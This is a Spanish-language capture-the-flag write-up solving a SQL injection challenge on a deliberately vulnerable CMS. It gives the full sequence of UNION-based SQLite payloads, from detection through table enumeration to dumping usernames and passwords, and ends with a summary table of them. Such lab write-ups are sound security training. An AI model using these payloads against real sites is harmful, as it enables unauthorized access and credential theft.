🔐 Writeup: SQL Injection - String
📋 Información del Reto
Campo	Detalle
Nombre	SQL injection - String
Plataforma	CMS v 0.0.2
Autor	g0uZ
Fecha	24 diciembre de 2012
Dificultad	Medio (7% resolución)
Puntos	30
Objetivo	Recuperar la contraseña del administrador
🎯 Declaración del Reto

    "Recuperar la contraseña de administrador"

El reto consiste en explotar una vulnerabilidad de Inyección SQL en un campo de búsqueda de un CMS para extraer la contraseña del usuario administrador.
🔍 Fase 1: Reconocimiento
1.1 Identificación del vector de ataque

Al acceder al sitio, encontramos un buscador de noticias. Este campo es nuestro punto de entrada.
<div align="center"> <img src="https://i.imgur.com/placeholder1.png" alt="Buscador del CMS" width="600"/> </div>

Figura 1: Campo de búsqueda vulnerable del CMS
1.2 Prueba de vulnerabilidad

Para confirmar si el campo es vulnerable a SQL Injection, probamos el payload clásico:
sql

' OR 1=1--

Resultado: El buscador devolvió TODOS los resultados de la base de datos.
<div align="center"> <img src="https://i.imgur.com/placeholder2.png" alt="Resultados de la inyección" width="600"/> </div>

Figura 2: Todos los resultados mostrados tras la inyección

✅ Confirmación: El campo es vulnerable a SQL Injection.
🧪 Fase 2: Enumeración
2.1 Determinar número de columnas

Para poder usar UNION SELECT, necesitamos saber cuántas columnas tiene la consulta original.

Payload:
sql

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

Resultado:
text

' UNION SELECT NULL,NULL--  ✅ Funciona (2 columnas)
' UNION SELECT NULL,NULL,NULL--  ❌ Error

<div align="center"> <img src="https://i.imgur.com/placeholder3.png" alt="Prueba de columnas" width="600"/> </div>

Figura 3: Confirmación de 2 columnas

📊 Conclusión: La consulta tiene 2 columnas.
2.2 Identificar columnas visibles

Para saber qué columnas se muestran en pantalla:
sql

' UNION SELECT 1,2--

Resultado: Ambas columnas (1 y 2) son visibles en los resultados.
<div align="center"> <img src="https://i.imgur.com/placeholder4.png" alt="Columnas visibles" width="600"/> </div>

Figura 4: Columnas 1 y 2 visibles en pantalla
🗄️ Fase 3: Extracción de Datos
3.1 Obtener nombres de tablas

Ahora que sabemos que hay 2 columnas, consultamos sqlite_master:
sql

' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table'--

Resultado:
text

news
users

<div align="center"> <img src="https://i.imgur.com/placeholder5.png" alt="Tablas encontradas" width="600"/> </div>

Figura 5: Tablas news y users encontradas

🎯 Objetivo: La tabla users contiene las credenciales.
3.2 Ver estructura de la tabla
sql

' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name='users'--

Resultado:
sql

CREATE TABLE users(
    username TEXT, 
    password TEXT, 
    Year INTEGER
)

<div align="center"> <img src="https://i.imgur.com/placeholder6.png" alt="Estructura de la tabla" width="600"/> </div>

Figura 6: Estructura de la tabla users

📋 Columnas identificadas:

    username (TEXT)

    password (TEXT)

    Year (INTEGER)

3.3 Extraer credenciales

Payload final para obtener todos los usuarios y contraseñas:
sql

' UNION SELECT username, password FROM users--

Resultado:
Username	Password
admin		***************
user1		OK4dSoYE
user2		8Wbhkzmd
<div align="center"> <img src="https://i.imgur.com/placeholder7.png" alt="Credenciales extraídas" width="600"/> </div>

Figura 7: Credenciales de todos los usuarios
🏆 Fase 4: Validación
4.1 Contraseña del administrador
text

******************

4.2 Verificación en el CMS

Al introducir las credenciales en el panel de administración:
<div align="center"> <img src="https://i.imgur.com/placeholder8.png" alt="Panel de admin" width="600"/> </div>

Figura 8: Acceso exitoso al panel de administración

✅ Reto completado con éxito!
📊 Resumen de Payloads Utilizados
#	Propósito	Payload
1	Detección	' OR 1=1--
2	N° de columnas	' UNION SELECT NULL,NULL--
3	Columnas visibles	' UNION SELECT 1,2--
4	Nombres de tablas	' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table'--
5	Estructura de tabla	' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name='users'--
6	Extraer datos	' UNION SELECT username, password FROM users--
